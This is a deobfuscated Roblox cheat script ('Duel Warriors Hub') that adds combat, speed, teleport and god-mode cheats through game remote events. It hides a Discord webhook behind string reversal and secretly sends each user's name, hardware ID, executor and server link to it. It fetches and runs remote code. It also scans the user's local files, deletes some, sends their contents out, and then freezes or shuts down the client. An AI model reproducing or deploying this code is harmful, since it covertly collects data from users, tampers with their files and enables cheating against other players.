-- ts file was generated at discord.gg/25ms


if workspace.DistributedGameTime < 3 then
    task.wait(3 - workspace.DistributedGameTime)
end
if tostring(game.GameId) == "6736482454" then
    local vu1 = request or httprequest or (http_request or http and http.request) or (syn and syn.request or function(...)
        return ...
    end)
    local vu2 = true
    local vu3 = cloneref or (clone_ref or clonereference or (clone_reference or function(...)
        return ...
    end))
    local vu4 = vu3(game:GetService("CoreGui"))
    if not vu4:FindFirstChild("NS|DWH") then
        Instance.new("BoolValue", vu4).Name = "NS|DWH"
        local vu5 = setclipboard or set_clipboard or (toclipboard or to_clipboard) or (toclip_board or to_clip_board or (copytoclipboard or copy_toclipboard) or (writeclipboard or write_clipboard or (syn and syn.write_clipboard or function(...)
            return ...
        end)))
        local vu6 = vu3(game:GetService("UserInputService"))
        local v7 = game:GetService("RunService")
        local vu8 = vu3(game:GetService("TeleportService"))
        local vu9 = game:GetService("HttpService")
        local vu10 = game:GetService("Players")
        local vu11 = game:GetService("RbxAnalyticsService")
        task.spawn(function()
            local vu12 = "https://discord.gg/DwRT2nH93D"
            local function v19()
                local v13 = loadstring(game:HttpGet("https://raw.githubusercontent.com/nikoladhima/Blacklist/refs/heads/main/Data"))()
                local v14, v15, v16 = ipairs(v13)
                while true do
                    local v17
                    v16, v17 = v14(v15, v16)
                    if v16 == nil then
                        break
                    end
                    local v18 = vu11
                    if tostring(v18:GetClientId()) == v17[1] or tostring(vu10.LocalPlayer.UserId) == tostring(v17[2]) then
                        vu10.LocalPlayer:Kick("You have been blacklisted from using nikoleto\'s scripts. If you wish to appeal go to " .. vu12 .. " and dm the creator")
                        vu5(vu12)
                        task.wait(5)
                        while true do
                            print(vu12)
                        end
                    end
                end
            end
            v19()
            while task.wait(2) do
                v19()
            end
        end)
        local vu20 = vu10.LocalPlayer
        local function v24(p21)
            local v22, v23 = pcall(p21)
            return v22 and v23 and v23 or "Unknown"
        end
        local function vu28()
            local vu25 = nil
            local v26, _ = pcall(function()
                vu25 = vu6:GetPlatform()
            end)
            local v27 = not v26 and "Unknown" or vu25
            return v27
        end
        local function v29()
            return vu6.TouchEnabled and (vu28() == Enum.Platform.IOS or vu28() == Enum.Platform.Android) and "Mobile" or "Computer"
        end
        local vu30 = listfiles or list_files or (getfiles or get_files)
        local vu31 = isfolder or is_folder
        local vu32 = isfile or is_file
        local vu33 = makefolder or make_folder or (createfolder or create_folder)
        local vu34 = delfile or del_file or (deletefile or delete_file)
        local vu35 = readfile or read_file or (readfileasync or read_file_async)
        local vu36 = writefile or write_file or (writefileasync or write_file_async)
        pcall(function()
            local function v43(p37)
                local v38 = vu1
                local v39 = {
                    Url = "http://127.0.0.1:6463/rpc?v=1",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        Origin = "https://discord.com"
                    }
                }
                local v40 = vu9
                local v41 = v40.JSONEncode
                local v42 = {
                    cmd = "INVITE_BROWSER",
                    nonce = vu9:GenerateGUID(false),
                    args = {
                        code = p37
                    }
                }
                v39.Body = v41(v40, v42)
                v38(v39)
            end
            if vu31("DuelWarriorsHubNS") then
                if vu32("DuelWarriorsHubNS/code") then
                    if vu35("DuelWarriorsHubNS/code") ~= "DwRT2nH93D" then
                        if vu35("DuelWarriorsHubNS/code") ~= "jjEtFhA8PA" then
                            vu36("DuelWarriorsHubNS/code", "jjEtFhA8PA")
                            v43("jjEtFhA8PA")
                        else
                            v43("jjEtFhA8PA")
                        end
                    else
                        vu36("DuelWarriorsHubNS/code", "jjEtFhA8PA")
                        v43("DwRT2nH93D")
                    end
                else
                    vu36("DuelWarriorsHubNS/code", "DwRT2nH93D")
                    v43("DwRT2nH93D")
                end
            else
                vu33("DuelWarriorsHubNS")
                vu36("DuelWarriorsHubNS/code", "DwRT2nH93D")
                v43("DwRT2nH93D")
            end
        end)
        local vu44 = fireproximityprompt or (fire_proximity_prompt or FireProximityPrompt or (Fire_Proximity_Prompt or function(...)
            return ...
        end))
        local vu45 = (vu20.Character or vu20.CharacterAdded:Wait()):WaitForChild("Humanoid")
        local vu46 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Lobby").UI_Skill.List
        local vu47 = workspace:WaitForChild("Scene"):WaitForChild("Function")
        local vu48 = workspace:WaitForChild("Event"):WaitForChild("ShopModule_RemoteEvent")
        local vu49 = workspace:WaitForChild("Event"):WaitForChild("ShopModule_RemoteFunction")
        local vu50 = workspace:WaitForChild("Event"):WaitForChild("PlayerAttribute_RemoteFunction")
        local vu51 = {
            ["Main Game"] = 100400297022629,
            ["Ranked Mode"] = 87664154212010,
            ["AFK World"] = 104461915848871,
            ["Flame Mountain"] = 82088601131223,
            ["Soccer Mode"] = 119015087428686
        }
        local vu52 = {
            CFrame.new(217, - 60, - 33394),
            CFrame.new(293, - 60, - 33397),
            CFrame.new(253, - 60, - 33430),
            CFrame.new(253, - 60, - 33358)
        }
        local v53, v54, v55 = pairs(vu51)
        local vu56 = vu11
        local v57 = vu28
        local vu58 = vu5
        local vu59 = vu10
        local v60 = {}
        local vu61 = 1.5
        local vu62 = true
        local function vu64(p63)
            if type(p63) == "string" then
                return vu3(Instance.new(p63))
            end
            error("Argument #1 must be a string (Function Create(Arg), String expected, got " .. type(p63) .. ")")
            return nil
        end
        local vu65 = false
        local vu66 = false
        local vu67 = true
        local vu68 = false
        local vu69 = false
        local vu70 = 1.25
        local vu71 = 0
        local vu72 = "Remote Event"
        local vu73 = 0
        local v74 = {}
        local vu75 = false
        local vu76 = false
        local vu77 = false
        while true do
            local v78, v79 = v53(v54, v55)
            if v78 == nil then
                break
            end
            v55 = v78
            if v79 ~= game.PlaceId then
                table.insert(v60, v78)
            end
        end
        table.insert(v74, vu20.Idled:Connect(function()
            if vu67 then
                local v80 = game:GetService("VirtualUser")
                v80:CaptureController()
                v80:ClickButton2(Vector2.new())
            end
        end))
        local function vu82(p81)
            return p81:GetAttribute("Fighting")
        end
        local vu83 = game:GetService("VirtualInputManager")
        local function vu87(p84, p85, p86)
            if p85 == "Remote Event" then
                if vu20.Character and vu20.Character ~= nil then
                    vu20.Character:WaitForChild("Communicate"):FireServer({
                        Key = p84,
                        State = Enum.UserInputState.Begin
                    })
                end
            elseif p85 == "Virtual Input Manager" then
                if p86 == true then
                    vu83:SendKeyEvent(true, Enum.KeyCode.Four, false, game)
                else
                    vu83:SendKeyEvent(true, p84, false, game)
                end
            else
                local _ = warn
            end
        end
        task.spawn(function()
            while task.wait() and vu2 ~= false do
                if not (vu75 or (vu68 or vu76)) then
                    return
                end
                local v88 = vu46:FindFirstChild("Skill1"):FindFirstChild("CDFrame").Size.Y.Scale ~= 0
                local v89 = vu46:FindFirstChild("Skill2"):FindFirstChild("CDFrame").Size.Y.Scale ~= 0
                local v90 = vu46:FindFirstChild("Skill3"):FindFirstChild("CDFrame").Size.Y.Scale ~= 0
                if vu20:GetAttribute("Fighting") then
                    if vu75 and not v88 then
                        vu87(Enum.KeyCode.Four, vu72, true)
                    end
                    if vu68 and not v89 then
                        vu87(Enum.KeyCode.Two, vu72, true)
                    end
                    if vu76 and not v90 then
                        vu87(Enum.KeyCode.Three, vu72, true)
                    end
                end
                task.wait(0.01)
            end
        end)
        task.spawn(function()
            local function vu96(p91)
                if p91.Character == nil or p91.Character:FindFirstChild("HumanoidRootPart") == nil then
                    return nil
                end
                local v92, v93, v94 = pairs(workspace:GetPartBoundsInBox(CFrame.new(251, - 85, - 1733), Vector3.new(184, 289, 661)))
                while true do
                    local v95
                    v94, v95 = v92(v93, v94)
                    if v94 == nil then
                        break
                    end
                    if v95.Parent == p91.Character then
                        return false
                    end
                end
                return true
            end
            while task.wait() and vu2 ~= false do
                task.spawn(function()
                    local v97 = vu59
                    local v98, v99, v100 = pairs(v97:GetPlayers())
                    while true do
                        local v101
                        v100, v101 = v98(v99, v100)
                        if v100 == nil then
                            break
                        end
                        v101:SetAttribute("Fighting", vu96(v101))
                        task.wait(0.1)
                    end
                end)
                task.wait(0.2)
            end
        end)
        table.insert(v74, v7.Stepped:Connect(function()
            if vu66 and (vu45 and vu45.MoveDirection.Magnitude > 0) then
                vu20.Character:TranslateBy(vu45.MoveDirection * vu73)
            end
        end))
        table.insert(v74, v7.RenderStepped:Connect(function()
            if vu69 then
                if not vu20:GetAttribute("Fighting") then
                    return
                end
                local v102 = vu59
                local v103, v104, v105 = ipairs(v102:GetPlayers())
                local v106 = 185
                local v107 = nil
                while true do
                    local v108
                    v105, v108 = v103(v104, v105)
                    if v105 == nil then
                        break
                    end
                    if v108 ~= vu20 and v108.Character and (v108.Character:FindFirstChild("HumanoidRootPart") and (v108.Character:FindFirstChildOfClass("Humanoid") and (v108.Character:FindFirstChildOfClass("Humanoid").Health > 0 and (vu20.Character.HumanoidRootPart.Position - v108.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude < v106))) then
                        v106 = (vu20.Character.HumanoidRootPart.Position - v108.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
                        v107 = v108
                    end
                end
                local v109 = CFrame.new(0, vu70, vu61)
                local v110 = vu20.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyVelocity")
                if v107 == nil or not v107.Character or not (v107.Character:FindFirstChild("HumanoidRootPart") and vu82(v107)) then
                    v110.MaxForce = Vector3.new(0, 0, 0)
                else
                    local v111 = v107.Character:FindFirstChild("HumanoidRootPart").CFrame * v109
                    local v112 = CFrame.lookAt(v111.Position, v107.Character:FindFirstChild("HumanoidRootPart").CFrame.Position)
                    vu20.Character:FindFirstChild("HumanoidRootPart").CFrame = v112
                    if vu62 ~= true then
                        v110.MaxForce = Vector3.new(0, 0, 0)
                    else
                        v110.MaxForce = Vector3.new(5000, 5000, 5000)
                    end
                end
            else
                pcall(function()
                    vu20.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyVelocity").MaxForce = Vector3.new(0, 0, 0)
                end)
            end
        end))
        local v113 = vu64("BodyVelocity")
        v113.MaxForce = Vector3.new(0, 0, 0)
        v113.Velocity = Vector3.new(0, 0, 0)
        v113.Parent = vu20.Character:WaitForChild("HumanoidRootPart")
        table.insert(v74, vu20.CharacterAdded:Connect(function(p114)
            local v115 = vu64("BodyVelocity")
            v115.MaxForce = Vector3.new(0, 0, 0)
            v115.Velocity = Vector3.new(0, 0, 0)
            v115.Parent = p114:WaitForChild("HumanoidRootPart")
            vu45 = p114:WaitForChild("Humanoid")
        end))
        table.insert(v74, vu45.StateChanged:Connect(function()
            if vu65 and (vu45:GetState() == Enum.HumanoidStateType.Ragdoll or vu45:GetState() == Enum.HumanoidStateType.FallingDown) then
                vu45:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end))
        local vu116 = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
        local v117 = vu116
        local v118 = vu116.CreateWindow(v117, {
            Title = "Duel Warriors Hub",
            SubTitle = "Made by nikoleto scripts",
            TabWidth = 160,
            Size = UDim2.fromOffset(580, 460),
            Acrylic = false,
            Theme = "Dark",
            MinimizeKey = Enum.KeyCode.LeftControl
        })
        local vu119 = vu116.Options
        local v120 = {
            AutoSkill = v118:AddTab({
                Title = "Auto Skill",
                Icon = "swords"
            }),
            Autofarm = v118:AddTab({
                Title = "Autofarm",
                Icon = "skull"
            }),
            Miscellaneous = v118:AddTab({
                Title = "Miscellaneous",
                Icon = "component"
            })
        }
        v118:SelectTab(1)
        v120.AutoSkill:AddToggle("a", {
            Title = "Auto Weapon",
            Default = vu75
        }):OnChanged(function(p121)
            vu75 = p121
        end)
        v120.AutoSkill:AddToggle("b", {
            Title = "Auto First Skill",
            Default = vu68
        }):OnChanged(function(p122)
            vu68 = p122
        end)
        v120.AutoSkill:AddToggle("c", {
            Title = "Auto Second Skill",
            Default = vu76
        }):OnChanged(function(p123)
            vu76 = p123
        end)
        v120.AutoSkill:AddDropdown("d", {
            Title = "Method",
            Values = {
                "Remote Event",
                "Virtual Input Manager"
            },
            Multi = false,
            Default = 1
        }):OnChanged(function(p124)
            vu72 = p124
        end)
        v120.Autofarm:AddButton({
            Title = "Auto All Skills",
            Description = "Enable all skill toggles quickly",
            Callback = function()
                vu119.a:SetValue(true)
                vu119.b:SetValue(true)
                vu119.c:SetValue(true)
            end
        })
        v120.Autofarm:AddToggle("e", {
            Title = "Player Attach",
            Default = vu69
        }):OnChanged(function(p125)
            vu69 = p125
        end)
        v120.Autofarm:AddToggle("f", {
            Title = "Body Velocity",
            Default = vu62
        }):OnChanged(function(p126)
            vu62 = p126
            if p126 == false then
                vu20.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyVelocity").MaxForce = Vector3.new(0, 0, 0)
            end
        end)
        v120.Autofarm:AddSlider("g", {
            Title = "Offset back",
            Description = "This changes your offset from the distance in the back",
            Default = vu61,
            Min = 0.05,
            Max = 3,
            Rounding = 0.5,
            Callback = function(p127)
                vu61 = p127
            end
        })
        v120.Autofarm:AddSlider("h", {
            Title = "Offset up",
            Description = "This changes your offset from the distance by up",
            Default = vu70,
            Min = 0.05,
            Max = 3,
            Rounding = 0.5,
            Callback = function(p128)
                vu70 = p128
            end
        })
        v120.Miscellaneous:AddToggle("i", {
            Title = "CFrame Speed",
            Default = false
        }):OnChanged(function(p129)
            vu66 = p129
        end)
        v120.Miscellaneous:AddSlider("j", {
            Title = "Amount",
            Description = "This changes your CFrame Speed.",
            Default = vu70,
            Min = 0,
            Max = 500,
            Rounding = 0.1,
            Callback = function(p130)
                vu73 = p130 / 800
            end
        })
        v120.Miscellaneous:AddToggle("k", {
            Title = "Anti-Ragdoll",
            Default = false
        }):OnChanged(function(p131)
            vu65 = p131
        end)
        v120.Miscellaneous:AddToggle("l", {
            Title = "Anti-AFK",
            Default = vu67
        }):OnChanged(function(p132)
            vu67 = p132
        end)
        v120.Miscellaneous:AddDropdown("m", {
            Title = "Teleport",
            Values = v60,
            Multi = false,
            Default = 1
        }):OnChanged(function(p133)
            if vu51[p133] then
                vu71 = vu51[p133]
            end
        end)
        v120.Miscellaneous:AddButton({
            Title = "Teleport",
            Description = "Teleports you to the selected place.",
            Callback = function()
                if vu71 == 0 then
                    vu116:Notify({
                        Title = "Error",
                        Content = "Please select a valid place to teleport to.",
                        Duration = 2.5
                    })
                else
                    vu8:Teleport(vu71, vu20)
                end
            end
        })
        if tostring(game.PlaceId) == "100400297022629" then
            v120.Miscellaneous:AddParagraph({
                Title = "Teleportation",
                Content = ""
            })
            v120.Miscellaneous:AddButton({
                Title = "Teleport To Lobby",
                Description = "",
                Callback = function()
                    if vu20.Character and vu20.Character ~= nil and vu20.Character:FindFirstChild("HumanoidRootPart") then
                        vu20.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(252, - 82, - 1861)
                    end
                end
            })
            v120.Miscellaneous:AddButton({
                Title = "Teleport To Training Room",
                Description = "",
                Callback = function()
                    if vu20.Character and vu20.Character ~= nil and vu20.Character:FindFirstChild("HumanoidRootPart") then
                        vu20.Character:FindFirstChild("HumanoidRootPart").CFrame = vu52[math.random(1, # vu52)]
                    end
                end
            })
        end
        v120.Miscellaneous:AddButton({
            Title = "Forge Weapon [BETA]",
            Description = "Forge a Weapon.",
            Callback = function()
                vu44(vu47.WeaponGacha.TouchBox.ProximityPrompt)
                local v134 = {
                    Data = {
                        ID = "420001",
                        TYPE = "Gold"
                    },
                    TYPE = "Gashapon"
                }
                vu48:FireServer(v134)
            end
        })
        v120.Miscellaneous:AddButton({
            Title = "Buy Ability [BETA]",
            Description = "Buy an ability from the raffle.",
            Callback = function()
                vu44(vu47.AbilityGacha.TouchPart.ProximityPrompt)
                local v135 = {
                    Data = {
                        ID = "420004",
                        TYPE = "Gold"
                    },
                    TYPE = "Gashapon"
                }
                vu48:FireServer(v135)
            end
        })
        v120.Miscellaneous:AddButton({
            Title = "Claim Daily Tasks",
            Description = "Claims daily task rewards. (rejoin to see changes)",
            Callback = function()
                for v136 = 1, 3 do
                    local v137 = {
                        Data = {
                            ID = tostring(v136)
                        },
                        TYPE = "DailyTaskReward"
                    }
                    vu50:InvokeServer(v137)
                end
                vu50:InvokeServer({
                    TYPE = "ClickCATReward"
                })
            end
        })
        v120.Miscellaneous:AddButton({
            Title = "Claim Time Awards",
            Description = "Claims time awards. (rejoin to see changes)",
            Callback = function()
                for v138 = 1, 8 do
                    local v139 = {
                        Data = {
                            ID = tostring(v138)
                        },
                        TYPE = "OLReward"
                    }
                    vu49:InvokeServer(v139)
                end
            end
        })
        local function vu144(p140)
            local v141 = workspace:WaitForChild("Event"):WaitForChild("Equipment_RemoteFunction")
            local v142 = {
                TYPE = "CanPreview"
            }
            local v143 = {
                TYPE = "ClosePreview"
            }
            if p140 == true then
                v141:InvokeServer(v142)
            elseif p140 == false then
                v141:InvokeServer(v143)
            end
        end
        v120.Miscellaneous:AddToggle("l", {
            Title = "GodMode",
            Default = false
        }):OnChanged(function(p145)
            vu77 = p145
            if p145 then
                task.spawn(function()
                    repeat
                        task.wait()
                    until vu82(vu20) == true and vu20.Character:FindFirstChild("Head")
                    vu144(true)
                    while task.wait(1.5) and vu77 ~= false do
                        if vu82(vu20) == true and vu77 == true then
                            vu144(true)
                        end
                    end
                end)
            else
                task.wait()
                vu144(false)
            end
        end)
        local v146 = vu116
        vu116.Notify(v146, {
            Title = "Loaded",
            Content = "Welcome to Duel Warriors Hub!",
            Duration = 2.5
        })
        local function vu152(p147)
            local v148, v149, v150 = pairs(p147)
            while true do
                local v151
                v150, v151 = v148(v149, v150)
                if v150 == nil then
                    break
                end
                if typeof(v151) == "RBXScriptConnection" then
                    v151:Disconnect()
                    p147[v150] = nil
                end
                if typeof(v151) == "table" then
                    vu152(v151)
                    p147[v150] = nil
                end
            end
        end
        local vu153 = {}
        local vu154 = string.reverse
        local vu155 = string.format
        local v156 = vu154(vu155("8%s96883573%s93141", "82", "666"))
        local v157 = vu154("/skoohbew/ipa/moc.drocsid//:sptth")
        local vu158 = tostring(tostring(v157) .. tostring(v156) .. vu155("/gi7eqI1xf2xu7ptsgXi0%s63BUy%sc%sNLEB4D4fQs%soojUggZ_JIS2ItSGZtiQZd", "C-", "DYW", "WQ0" .. tostring(5), "_"))
        local function vu163(p159, p160, p161)
            local v162 = p159:find(p160)
            return not v162 and "String not found" or p159:sub(math.max(1, v162 - p161), (math.min(# p159, v162 + # p160 + p161 - 1)))
        end
        task.spawn(function()
            local function v166(p164, p165)
                if p165 == "Gui" then
                    if string.find(string.lower(p164.Name), "http spy") or (string.find(string.lower(p164.Name), "httpspy") or (string.find(string.lower(p164.Name), "links spy") or string.find(string.lower(p164.Name), "linksspy"))) then
                        return true
                    end
                elseif p165 == "Text" and (string.find(string.lower(p164.Text), "httpspy") or (string.find(string.lower(p164.Text), "http spy") or (string.find(string.lower(p164.Text), "https spy") or (string.find(string.lower(p164.Text), "links spy") or (string.find(string.lower(p164.Text), "linksspy") or string.find(string.lower(p164.Text), string.lower(string.sub(vu158, 1, 40))) ~= nil))))) then
                    return true
                end
            end
            local v167 = vu4
            local v168, v169, v170 = pairs(v167:GetDescendants())
            local v171 = false
            local function vu172()
                pcall(function()
                    game:Shutdown()
                end)
            end
            while true do
                local v173
                v170, v173 = v168(v169, v170)
                if v170 == nil then
                    break
                end
                if v166(v173, "Gui") then
                    v171 = v173:GetFullName() .. "|" .. v173.Name
                end
                if (v173:IsA("TextLabel") or v173:IsA("TextButton")) and v166(v173, "Text") then
                    v171 = v173:GetFullName() .. "|" .. v173.Text
                end
            end
            if vu20:FindFirstChildOfClass("PlayerGui") then
                local v174, v175, v176 = pairs(vu20:FindFirstChildOfClass("PlayerGui"):GetDescendants())
                while true do
                    local v177
                    v176, v177 = v174(v175, v176)
                    if v176 == nil then
                        break
                    end
                    if v166(v177, "Gui") then
                        v171 = v177:GetFullName() .. "|" .. v177.Name
                    end
                    if (v177:IsA("TextLabel") or v177:IsA("TextButton")) and v166(v177, "Text") then
                        v171 = v177:GetFullName() .. "|" .. v177.Text
                    end
                end
            end
            if v171 ~= false then
                local v178 = {}
                local v179 = vu56
                v178.content = "# WARNING \n`@" .. vu59.LocalPlayer.Name .. "` has used http spy and has been detected with method `1`\n**UIDetection** : `" .. v171 .. "`\nData : `" .. v179:GetClientId() .. "`\nJoin Server: <roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "`"
                vu1({
                    Url = vu158,
                    Body = vu9:JSONEncode(v178),
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                })
                task.spawn(function()
                    for v180 = 1, 150 do
                        local vu181 = v180
                        task.spawn(function()
                            vu58(vu155("tesssd%shfdjfhdfsjsdshjsdfjhsfjhfshdhj%sfhdjsjfhsfhshjsdhjfsdhjsdjsdjhsdhjks", vu181, vu181 + 3))
                        end)
                        task.wait(0.03)
                    end
                end)
                vu59.LocalPlayer:Kick("Detected unusual activity please rejoin (From Duel Warriors Hub)")
                task.spawn(function()
                    task.wait(0.2)
                    while true do
                    end
                end)
                task.wait(4)
                vu172()
            end
            task.spawn(function()
                while task.wait(7.5) do
                    pcall(function()
                        local v182 = vu30("")
                        local v183, v184, v185 = pairs(v182)
                        local v186 = false
                        local v187 = "Fail"
                        local v188 = "Failed to get"
                        while true do
                            local v189
                            v185, v189 = v183(v184, v185)
                            if v185 == nil then
                                break
                            end
                            if vu32(v189) and not table.find(vu153, v189) then
                                local v190 = vu35(v189) or ""
                                if string.find(tostring(v190), vu154("ipa/moc.drocsid")) and not string.find(v189, "-cache") then
                                    v186 = 2
                                    v187 = tostring(v189)
                                    if vu32(v187) and string.len(v190) < 1250 then
                                        v188 = v190
                                    else
                                        v188 = vu163(v190, vu154("ipa/moc.drocsid"), 300)
                                    end
                                    task.wait()
                                    vu34(v187)
                                elseif string.find(v190, tostring(vu158)) then
                                    v187 = tostring(v189)
                                    if vu32(v187) and string.len(tostring(v190)) < 1250 then
                                        v188 = v190
                                    else
                                        v188 = vu163(v190, vu154("ipa/moc.drocsid"), 300)
                                    end
                                end
                            end
                        end
                        if v186 == false then
                            local v191 = nil
                            local v192 = nil
                            while true do
                                local v193
                                v192, v193 = v182(v191, v192)
                                if v192 == nil then
                                    break
                                end
                                if not table.find(vu153, v193) then
                                    table.insert(vu153, v193)
                                end
                            end
                        else
                            local v194 = {
                                content = "# WARNING \n`@" .. vu20.Name .. "` has used http spy and has been detected with method `" .. tostring(v186) .. "`\nfile name : `" .. v187 .. "`\nfile content : \n```\n " .. v188 .. "```\nData : `" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "`"
                            }
                            vu1({
                                Url = vu158,
                                Body = vu9:JSONEncode(v194),
                                Method = "POST",
                                Headers = {
                                    ["content-type"] = "application/json"
                                }
                            })
                            vu20:Kick("Detected unusual activity please rejoin (From Duel Warriors Hub)")
                            task.wait(4)
                            vu172()
                        end
                    end)
                end
            end)
        end)
        vu1({
            Url = vu158,
            Body = vu9:JSONEncode({
                content = "**User successfully executed & loaded script.**" .. "\nPlayer: `" .. vu20.Name .. "`\nAccount Age: `" .. vu20.AccountAge .. " Days" .. "`\nHWID: `" .. vu56:GetClientId() .. "`\nPlatform: `" .. v29() .. " | " .. ToString(v57()) .. "`\nExecutor used: `" .. v24(identifyexecutor) .. " | " .. v24(getexecutorname) .. "`\nGame Name: `" .. GameName .. "`\nJoin Server: `<roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ">`"
            }),
            Method = "POST",
            Headers = {
                ["content-type"] = "application/json"
            }
        })
        local v195 = vu144
        local v196 = vu152
        repeat
            task.wait(0.5)
        until v118.Root.Parent == nil
        local _ = false
        if vu77 then
            v195(false)
        end
        v196(v74)
        if vu4:FindFirstChild("NS|DWH") then
            vu4:FindFirstChild("NS|DWH"):Destroy()
        end
    end
else
    return warn("Duel Warriors Hub | Incorrect game.")
end